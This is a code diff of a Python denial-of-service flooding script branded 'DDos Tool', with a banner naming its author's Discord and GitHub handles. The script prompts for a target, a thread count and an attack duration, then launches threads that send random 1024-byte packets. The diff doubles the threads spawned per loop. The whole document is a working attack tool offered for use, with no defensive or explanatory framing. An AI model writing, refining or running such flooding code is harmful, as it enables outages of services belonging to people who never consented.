@@ -3,29 +3,44 @@ import random
 import threading
 import sys
 import time
-import os
 
 from os import system
 
-system("mode 50,10")
-system("title DDos Tool @hvrl")
+system("title ")
+system("mode 70, 20")
+
+def gui():
+    print(
+'''
+\x1b[31m╔═════════════════════════════════════════════════╗
+                           _______  _           
+        |\     /||\     /|(  ____ )( \          
+        | )   ( || )   ( || (    )|| (          
+        | (___) || |   | || (____)|| |          
+        |  ___  || |   | ||     __)| |          
+        | (   ) || |   | || (\ (   | |          
+        | )   ( || (___) || ) \ \__| (____/\\   
+        |/     \|(_______)|/   \__/(_______/    
+
+       \x1b[38;5;56m[Discord] \x1b[31mhurl#8400 \x1b[38;5;56m[Github] \x1b[31mhvrrl                                    
+\x1b[31m╚═════════════════════════════════════════════════╝
+''')
 
 def start():
-    print("GitHub @hvrrl")
-    print('')
+    gui()
     global TARGET
     global THREADS
     global TIME
+    global timeout
     try:
         TARGET = str(input("ENTER YOUR TARGET: "))
         THREADS = int(input("ENTER THREADS: "))
         TIME = float(input("ENTER ATTACK DURATION: "))
+        timeout = time.time() + 1*TIME
     except:
         print("Invalid Input")
     system("cls")
     
-timeout = time.time() + 1*TIME
-
 def attack():
     try:
         bytes = random._urandom(1024)
@@ -42,11 +57,12 @@ def main():
     while True:
         start()
         for x in range(0, THREADS):
-            threading.Thread(target=attack).start()
-            
+            t1 = threading.Thread(target=attack)
+            t1.start()
+            t2 = threading.Thread(target=attack)
+            t2.start()
+
         time.sleep(TIME)
-        print("ATTACK DONE")
-        time.sleep(1)
         system("cls")
 
 if __name__ == '__main__':
